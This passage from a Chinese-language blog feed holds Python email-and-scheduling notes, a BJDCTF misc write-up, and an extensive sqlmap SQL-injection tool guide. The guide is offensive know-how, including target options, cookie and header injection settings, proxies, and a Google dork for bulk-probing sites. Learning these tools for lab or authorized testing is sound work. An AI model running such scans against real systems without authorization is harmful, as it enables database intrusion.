class="token punctuation">(</span>message<span class="token punctuation">.</span>body<span class="token punctuation">[</span><span class="token string">'plain'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>message.sent_from     发件人<br>message.sent_to       收件人<br>message.subject       主题<br>message.date          时间<br>message.body[‘plain’] 文本格式内容<br>message.body[‘html’]  HTML格式内容<br>message.attachements  附件</p></blockquote><blockquote><p>imbox.messages(unread=True)           查看未读邮件<br>imbox.messages(flagged=True)          查看红旗邮件<br>imbox.messages(sent_from=‘<a href="mailto:&#x61;&#64;&#97;&#x2e;&#x63;&#111;&#109;">&#x61;&#64;&#97;&#x2e;&#x63;&#111;&#109;</a>‘)   查看某发件人邮件<br>imbox.messages(sent_to=‘<a href="mailto:&#x61;&#64;&#97;&#46;&#x63;&#111;&#x6d;">&#x61;&#64;&#97;&#46;&#x63;&#111;&#x6d;</a>‘)     查看某收件人邮件<br>imbox.messages(data_lt=datetime.data(2019,10,8))          具体日期某天前(import datetime)<br>imbox.messages(data_gt=datetime.data(2019,10,8))          具体日期某天后<br>imbox.messages(data_on=datetime.data(2019,10,8))          指定某一天</p></blockquote><h3 id="标记已读和删除邮件"><a href="#标记已读和删除邮件" class="headerlink" title="标记已读和删除邮件"></a>标记已读和删除邮件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> uid<span class="token punctuation">,</span>message <span class="token keyword">in</span> all_inbox_messages<span class="token punctuation">:</span>    <span class="token keyword">if</span> 某种条件<span class="token punctuation">:</span>        imbox<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>uid<span class="token punctuation">)</span>        imbox<span class="token punctuation">.</span>mark_seen<span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> schedule<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">job</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"填写所要做的任务"</span><span class="token punctuation">)</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>minutes<span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>              <span class="token comment">#每10分钟做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hour<span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>                   <span class="token comment">#every里无参数代表1，每1小时做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>day<span class="token punctuation">.</span>at<span class="token punctuation">(</span><span class="token string">"10:30"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>        <span class="token comment">#每天在10:30时做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>minutes<span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>        <span class="token comment">#每5到10分钟做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>monday<span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>                 <span class="token comment">#每周一做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>wednesday<span class="token punctuation">.</span>at<span class="token punctuation">(</span><span class="token string">"13:15"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>  <span class="token comment">#每周三13:15做一次</span>schedule<span class="token punctuation">.</span>every<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>minutes<span class="token punctuation">.</span>at<span class="token punctuation">(</span><span class="token string">":17"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>do<span class="token punctuation">(</span>job<span class="token punctuation">)</span>      <span class="token comment">#每分钟在第17秒做一次</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    schedule<span class="token punctuation">.</span>run_pending<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning_Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 脚本编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF记录</title>
      <link href="/2020/03/25/BJDCTF%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/03/25/BJDCTF%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>一次CTF比赛记录</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f1.jpeg"></p><p>可以看到图片中间明显错位，直接UltraEdit搜索BJD</p><blockquote><p>想复杂了，想改变图片高度宽度之类的，淦</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f2.png"></p><p>或者使用strings命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">kali@kali:~&#x2F;Desktop$ strings xiaojiejie.jpeg | grep &quot;BJD&quot;BJD&#123;haokanma_xjj&#125;|&#x2F;|<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="简单的MISC"><a href="#简单的MISC" class="headerlink" title="简单的MISC"></a>简单的MISC</h3><p><a href="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/secret.zip">题目</a><br>先是zip伪加密</p><blockquote><p>拿到一个压缩文件，先查看是否是伪加密</p></blockquote><blockquote><p>在压缩文件里的每个文件的文件目录字段有一位专门标识了文件是否加密，将其设置为00，若为伪加密，即可成功解开压缩包</p></blockquote><p>用UltraEdit打开压缩包，搜索目录字段 50 4B 01 02，从50开始计算，第九第十个bit即为加密字段，将其设置为00<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f3.png"><br>成功解开压缩包</p><p>打开secret文件，查看到有IHDR数据块<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f4.png"> </p><blockquote><p>IHDR数据块是PNG文件头数据块，二进制为0D 0A 1A 0A  </p></blockquote><p>缺失了PNG文件头，补上文件头89 50 4E 47<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f5.png"><br>后缀名改成png，可以看到一串字符串<br>尝试16进制解码得到flag</p><h3 id="TARGZ"><a href="#TARGZ" class="headerlink" title="TARGZ"></a>TARGZ</h3><p><a href="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/hW1ES89jF.tar.gz">题目</a><br>题目中提示解压密码不需要爆破，密码猜想是文件名字<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f6.png"><br>解压之后发现又是一个压缩包，使用Python脚本递归解压</p><details><summary>python脚本</summary><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfilep <span class="token operator">=</span> <span class="token string">'hW1ES89jF'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    z<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>p<span class="token operator">+</span><span class="token string">'.tar.gz'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>    z<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span>p<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token operator">=</span>z<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>    z<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></details><blockquote><p>注意pwd参数需要转成字节</p></blockquote><p>最后报错得出flag文件</p><h3 id="圣火昭昭"><a href="#圣火昭昭" class="headerlink" title="圣火昭昭"></a>圣火昭昭</h3><p><a href="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/sheng_huo_zhao_zhao.zip">题目</a><br>题目提示全靠<strong>猜</strong>，使用outguess<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f7.png"><br>查看图片备注信息，是新佛曰，去<a href="http://hi.pcmoe.net/buddha.html">网站</a>解密得到密码<br>使用outguess解密图片得到flag  </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">outguess -k &quot;gemlove&quot; -r sheng_huo_zhao_zhao.jpg 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/CTF-files/Misc-A_Beautiful_Picture-DreamerJack.png"><br>查看图片分辨率为1000 $\times$ 900,修改图片高度为1000<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_WriteUp/BJDCTF_f8.png">    </p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap详解</title>
      <link href="/2020/03/17/sqlmap/"/>
      <url>/2020/03/17/sqlmap/</url>
      
        <content type="html"><![CDATA[<p>sqlmap使用详解</p><h2 id="获取目标系统信息-–banner"><a href="#获取目标系统信息-–banner" class="headerlink" title="获取目标系统信息 –banner"></a>获取目标系统信息 –banner</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://127.0.0.1/sqli/less-1/?id=1"</span> --batch --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="对多个目标进行探测"><a href="#对多个目标进行探测" class="headerlink" title="对多个目标进行探测"></a>对多个目标进行探测</h2><ul><li>Sqlmap支持从不同类型的文件中读取目标进行Sql注入探测</li></ul><ol><li><p>-l 从Burpsuite proxy或WebScarab proxy中读取Http请求日志文件</p><blockquote><h3 id="设置日志过滤目标"><a href="#设置日志过滤目标" class="headerlink" title="设置日志过滤目标"></a>设置日志过滤目标</h3><p>与使用选项-l使用从提供的日志解析的所有主机不同，您可以指定有效的Python正则表达式，用于过滤所需的日志</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -l burp.log --scope<span class="token operator">=</span><span class="token string">"(www)?\.target\.(com|net|org)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–skip-urlencode 不进行URL编码</p></li><li><p>-x 从sitemap.xml站点地图文件中读取目标探测。  </p></li><li><p>-m 从多行文本格式文件读取多个目标，对多个目标进行探测。  </p></li><li><p>-r 从文本文件中读取Http请求作为Sql注入探测的目标。  </p></li><li><p>-c 从配置文件sqlmap.conf中读取目标探测。</p></li></ol><h3 id="burpsuite保存日志文件"><a href="#burpsuite保存日志文件" class="headerlink" title="burpsuite保存日志文件"></a>burpsuite保存日志文件</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sqlmap/sqlmap_f1.png"></p><p>将日志文件复制到sqlmap文件目录下</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sqlmap/sqlmap_f2.png"></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -l <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在探测完一个目标后，会继续询问是否探测文件中的下一个目标</p><h3 id="m，对txt文件探测"><a href="#m，对txt文件探测" class="headerlink" title="-m，对txt文件探测"></a>-m，对txt文件探测</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sqlmap/sqlmap_f3.png"></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -m <span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="通过谷歌批量探测"><a href="#通过谷歌批量探测" class="headerlink" title="通过谷歌批量探测"></a>通过谷歌批量探测</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -g <span class="token string">"inurl:.php?id="</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="设置请求参数"><a href="#设置请求参数" class="headerlink" title="设置请求参数"></a>设置请求参数</h2><h3 id="设置HTTP请求方法"><a href="#设置HTTP请求方法" class="headerlink" title="设置HTTP请求方法"></a>设置HTTP请求方法</h3><p>sqlmap会自动在探测过程中使用适合的HTTP请求方法，但是在某些具体情况下，需要强制使用具体的请求方法，如PUT请求方法，因为PUT不会自动使用</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--method<span class="token operator">=</span>PUT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置POST提交参数"><a href="#设置POST提交参数" class="headerlink" title="设置POST提交参数"></a>设置POST提交参数</h3><p>默认情况下，HTTP请求的方法是GET，但是可以在提供POST请求中发送的数据隐式地将其更改为POST</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://192.168.0.100/sqli/Less-11/"</span> --data <span class="token string">"uname=admin&amp;passwd=admin&amp;submit=Submit"</span> -f --banner --dbs --users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里-f是指 fingerprint 指纹信息</p></blockquote><h3 id="设置参数分隔符"><a href="#设置参数分隔符" class="headerlink" title="设置参数分隔符"></a>设置参数分隔符</h3><p>有时候需要覆盖默认的参数分隔符，才能正确地分隔和和单独处理每个参数</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://192.168.0.100/sqli/Less-11/"</span> --data <span class="token string">"uname=admin&amp;passwd=admin&amp;submit=Submit"</span> --param-del<span class="token operator">=</span><span class="token string">"&amp;"</span> -f --banner --dbs --users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置Cookie头"><a href="#设置Cookie头" class="headerlink" title="设置Cookie头"></a>设置Cookie头</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://www.target.com/?id=1"</span> --cookie <span class="token string">"security=low; PHPSESSID=lajsoguwekl021"</span> --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>如果在通信过程中，web应用程序使用Set-Cookie标头进行响应，sqlmap将在所有进一步的HTTP请求中自动使用其值作为Cookie标头。sqlmap还将为SQL注入自动测试这些值。这可以通过提供–drop-set-cookie—sqlmap将忽略任何即将到来的Set-Cookie头来避免。  </li><li>反之亦然，如果提供了一个带有选项的HTTP Cookie报头—Cookie和目标URL在任何时候发送一个HTTP set-Cookie报头，sqlmap将询问您要为以下HTTP请求使用哪组Cookie。  </li><li>load-cookie，可以用来提供包含Netscape/wget格式的cookie的特殊文件  <blockquote><p>注意：如果需要对HTTP Cookie值进行SQL注入探测，需要设置 –level 2以上（3）</p></blockquote></li></ul><h3 id="设置user-agent"><a href="#设置user-agent" class="headerlink" title="设置user-agent"></a>设置user-agent</h3><h4 id="指定user-agent"><a href="#指定user-agent" class="headerlink" title="指定user-agent"></a>指定user-agent</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://www.target.com/?id=1"</span> --user-agent<span class="token operator">=</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"</span> --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="也可以随机筛选"><a href="#也可以随机筛选" class="headerlink" title="也可以随机筛选"></a>也可以随机筛选</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://www.target.com/?id=1"</span> --random-agent --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>针对user-agent注入的值，要设置–level为3</p></blockquote><h3 id="设置Host头"><a href="#设置Host头" class="headerlink" title="设置Host头"></a>设置Host头</h3><p>可以手动设置HTTP主机头的值，可在host最后加一个*，表示对host探测是否存在注入</p><blockquote><p>若 –level 设置为5，将对HTTP主机头进行SQL注入检测 </p></blockquote><h3 id="设置Referer"><a href="#设置Referer" class="headerlink" title="设置Referer"></a>设置Referer</h3><p>默认情况下，不会发送HTTP引用头</p><blockquote><p>若 –level 设置为3或以上，将针对HTTP引用头进行SQL注入测试</p></blockquote><h3 id="设置额外HTTP头"><a href="#设置额外HTTP头" class="headerlink" title="设置额外HTTP头"></a>设置额外HTTP头</h3><p>设置选项–header，可以提供额外的HTTP标头，每个标头必须用换行符\n分隔  </p><p>从配置文件sqlmap.conf中提供它们会更容易</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://www.target.com/?id=1"</span> --headers<span class="token operator">=</span><span class="token string">"Host:www.target.com<span class="token entity" title="\n">\n</span>User-agent:Firefox 1.0"</span> -v <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>设置单个用 -H, 多个用 –headers</p></blockquote><h3 id="设置HTTP协议认证"><a href="#设置HTTP协议认证" class="headerlink" title="设置HTTP协议认证"></a>设置HTTP协议认证</h3><p>Sqlmap中设置HTTP协议认证的参数：–auth-type和–auth-cred, 其中–auth-type支持 Basic、Digest、NTLM<br>–auth-cred认证语法为：username:password</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://url/arit.php?id=1"</span> --auth-type Basic --auth-cred <span class="token string">"testuser:testpass"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置HTTP代理"><a href="#设置HTTP代理" class="headerlink" title="设置HTTP代理"></a>设置HTTP代理</h3><ul><li>Sqlmap中设置代理的参数：–proxy, –proxy-cred, –proxy-file, –ignore-proxy  </li><li>其中–proxy用来设置HTTP代理服务器位置 格式：–proxy http(s)://ip[:端口]  </li><li>–proxy-cred用来设置HTTP代理服务器认证信息 格式：–proxy-cred username:password  </li><li>–proxy-file用来设置多条代理在文件中  </li><li>–ignore-proxy当您希望通过忽略系统范围内的HTTP(S)代理服务器设置来针对本地网络的目标部分运行sqlmap时，应该使用这种方法。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sqlmap/sqlmap_f4.png"></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://url/arit.php?id=1"</span> --proxy <span class="token string">"http://122.5.190.206:9999"</span> --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置延迟"><a href="#设置延迟" class="headerlink" title="设置延迟"></a>设置延迟</h3><p>–delay 0.5 延迟0.5秒</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://url/arit.php?id=1"</span> --delay <span class="token number">0.5</span> --banner<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置超时"><a href="#设置超时" class="headerlink" title="设置超时"></a>设置超时</h3><p>指定等待响应的秒数，默认为30秒</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--timeout <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置重试次数"><a href="#设置重试次数" class="headerlink" title="设置重试次数"></a>设置重试次数</h3><p>默认重试3次<br>通常结合timeout参数使用</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--retries <span class="token number">4</span> --timeout <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="忽略401"><a href="#忽略401" class="headerlink" title="忽略401"></a>忽略401</h3><p>忽略返回HTTP错误401(未经授权的)的站点</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--ignore-401<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置HTTP协议私钥"><a href="#设置HTTP协议私钥" class="headerlink" title="设置HTTP协议私钥"></a>设置HTTP协议私钥</h3><p>当web服务器需要适当的客户端证书和用于身份验证的私钥时，应该使用此选项。提供的值应该是一个PEM格式的key_file，其中包含证书和私钥。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--auth-file 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h3><p>有时，如果执行了一定数量的不成功请求，则在此期间的web应用程序或检查技术会销毁会话。这可能发生在sqlmap的检测阶段或利用任何盲SQL注入类型时。原因是SQL有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--safe-url, --safe-post, --safe-req  --safe-freq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="sqlmap性能优化"><a href="#sqlmap性能优化" class="headerlink" title="sqlmap性能优化"></a>sqlmap性能优化</h2><h3 id="设置持久HTTP连接，在一定程度上避免服务器受到探测影响"><a href="#设置持久HTTP连接，在一定程度上避免服务器受到探测影响" class="headerlink" title="设置持久HTTP连接，在一定程度上避免服务器受到探测影响"></a>设置持久HTTP连接，在一定程度上避免服务器受到探测影响</h3><p>设置连接为持久连接，即在HTTP报文中设置Connection: Keep-Alive</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--keep-alive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="不接收HTTP-Body"><a href="#不接收HTTP-Body" class="headerlink" title="不接收HTTP Body"></a>不接收HTTP Body</h3><p>设置空连接，表示不接受HTTP中的Body，常用于盲注</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--null-connection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置多线程"><a href="#设置多线程" class="headerlink" title="设置多线程"></a>设置多线程</h3><p>默认3个多线程，最大为10</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--thread <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意探测过快会影响服务器性能</p></blockquote><h3 id="设置预测输出"><a href="#设置预测输出" class="headerlink" title="设置预测输出"></a>设置预测输出</h3><p>在推理算法中用于检索值字符的顺序统计预测</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--predict-output<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意与–thread不兼容</p></blockquote><h3 id="一键优化"><a href="#一键优化" class="headerlink" title="一键优化"></a>一键优化</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加此参数相当于同时添加下列三个优化参数：</p><ul><li>–keep-alive  </li><li>–null-connection  </li><li>–threads=3 （如果没有设置一个更好的值）</li></ul><hr><h2 id="指定位置注入"><a href="#指定位置注入" class="headerlink" title="指定位置注入"></a>指定位置注入</h2><h3 id="指定具体探测的参数"><a href="#指定具体探测的参数" class="headerlink" title="指定具体探测的参数"></a>指定具体探测的参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-p <span class="token string">"id,user-agent"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="忽略探测具体的参数"><a href="#忽略探测具体的参数" class="headerlink" title="忽略探测具体的参数"></a>忽略探测具体的参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--skip <span class="token string">"user-agent,referer"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="忽略包含具体内容的参数"><a href="#忽略包含具体内容的参数" class="headerlink" title="忽略包含具体内容的参数"></a>忽略包含具体内容的参数</h3><p>如不对包含token或session的参数进行探测</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--param-exclude<span class="token operator">=</span><span class="token string">"token|session"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="忽略静态参数"><a href="#忽略静态参数" class="headerlink" title="忽略静态参数"></a>忽略静态参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--skip-static<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置URL注入位置"><a href="#设置URL注入位置" class="headerlink" title="设置URL注入位置"></a>设置URL注入位置</h3><p>当注入点位于URL本身内部时，要手动指向URL路径，否则sqlmap不会对URL路径执行任何自动测试，必须在命令行中添加星号(*)来指定这些注入点<br>当使用Apache web服务器的mod_rewrite模块或其他类似的技术时，这就显得特别有用了</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://targeturl/param1/value1*/param2/value2/"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="不仅可以对URL任意位置指定注入，还可以在HTTP头的任意位置注入，加星号-即可"><a href="#不仅可以对URL任意位置指定注入，还可以在HTTP头的任意位置注入，加星号-即可" class="headerlink" title="不仅可以对URL任意位置指定注入，还可以在HTTP头的任意位置注入，加星号(*)即可"></a>不仅可以对URL任意位置指定注入，还可以在HTTP头的任意位置注入，加星号(*)即可</h3><hr><h2 id="注入参数"><a href="#注入参数" class="headerlink" title="注入参数"></a>注入参数</h2><h3 id="强制设置DBMS-数据库管理系统"><a href="#强制设置DBMS-数据库管理系统" class="headerlink" title="强制设置DBMS(数据库管理系统)"></a>强制设置DBMS(数据库管理系统)</h3><p>默认会自动识别DBMS，以下是sqlmap完全支持的DBMS种类</p><blockquote><p>Mysql、Oracle、Microsoft SQL Server、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB、Informix</p></blockquote><p>强制指定，可以避免再探测是否是其他的数据库，可以加快探测速度</p><p>–dbms 数据库管理系统名称 [版本号]</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--dbms microsoft sql server 05<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="强制设置OS系统"><a href="#强制设置OS系统" class="headerlink" title="强制设置OS系统"></a>强制设置OS系统</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--os windows--os linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它<br>如果不知道它，让sqlmap自动为您识别</p></blockquote><h3 id="关闭负载转换机制"><a href="#关闭负载转换机制" class="headerlink" title="关闭负载转换机制"></a>关闭负载转换机制</h3><p>在检索结果时，sqlmap使用一种机制，在这种机制中，所有条目都被转换为字符串类型，并在NULL值的情况下用空格字符替换。这样做是为了防止出现任何错误状态(例如，将空值与字符串值连接起来)，并简化数据检索过程本身。尽管如此，还是有报告的案例(例如MySQL DBMS的旧版本)由于数据检索本身的问题(例<br>如没有返回值)需要关闭这种机制(使用此开关)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--no-cast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="关闭字符转义机制"><a href="#关闭字符转义机制" class="headerlink" title="关闭字符转义机制"></a>关闭字符转义机制</h3><p>在sqlmap需要在有效负载中使用(单引号分隔)字符串值(例如，选择’foobar’)时，这些值将自动转义(例如，选择CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114)) </p><p>这样做的原因有两个:混淆有效负载内容和防止后端服务器上查询转义机制(例如magic_quotes<br>和/或mysql_real_escape_string)的潜在问题。用户可以使用这个开关关闭它(可以减少有效负载大小)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">--no-escape<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="强制设置无效值替换"><a href="#强制设置无效值替换" class="headerlink" title="强制设置无效值替换"></a>强制设置无效值替换</h3><p>sqlmap在需要使原始参数值无效时，一般会使用经典否定(如id=-1)，使用参数可强制替换为别的否定</p><p>如使用大整数值，如id=99999999</p><pre class="line-numbers 